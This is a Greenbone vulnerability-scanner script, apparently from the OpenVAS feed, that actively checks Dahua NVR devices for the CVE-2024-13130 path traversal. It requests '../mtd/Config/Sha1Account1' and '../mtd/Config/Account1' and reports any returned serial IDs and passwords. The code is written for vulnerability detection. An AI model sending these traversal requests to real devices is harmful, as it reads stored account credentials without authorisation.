# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dahua:nvr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.153715");
  script_version("2025-01-07T06:11:07+0000");
  script_tag(name:"last_modification", value:"2025-01-07 06:11:07 +0000 (Tue, 07 Jan 2025)");
  script_tag(name:"creation_date", value:"2025-01-06 05:11:35 +0000 (Mon, 06 Jan 2025)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2024-13130");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Dahua Devices Path Traversal Vulnerability (Jan 2025) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dahua_devices_http_detect.nasl");
  script_mandatory_keys("dahua/device/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Multiple Dahua devices (and their OEMs) are prone to a path
  traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Affected by this issue is some unknown functionality of the
  file ../mtd/Config/Sha1Account1 of the component Web Interface. The manipulation leads to path
  traversal: '../filedir'.");

  script_tag(name:"solution", value:"No known solution is available as of 06th January, 2025.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://netsecfish.notion.site/Path-Traversal-Vulnerability-in-IntelBras-IP-Cameras-mtd-Config-Sha1Account1-and-mtd-Confi-15e6b683e67c80809442ee3425f753b7");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

urls = make_list("/mtd/Config/Sha1Account1",
                 "/mtd/Config/Account1");

foreach url (urls) {
  req = http_get(port: port, item: ".." + url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if ('"SerialID"' >< res && '"Password"' >< res) {
    info['HTTP Method'] = "GET";
    info['Affected URL'] = http_report_vuln_url(port: port, url: ".." + url, url_only: TRUE);

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to access the endpoint "' + url + '"';
    report += '\n\nResult:\n\n' + chomp(res);
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(0);
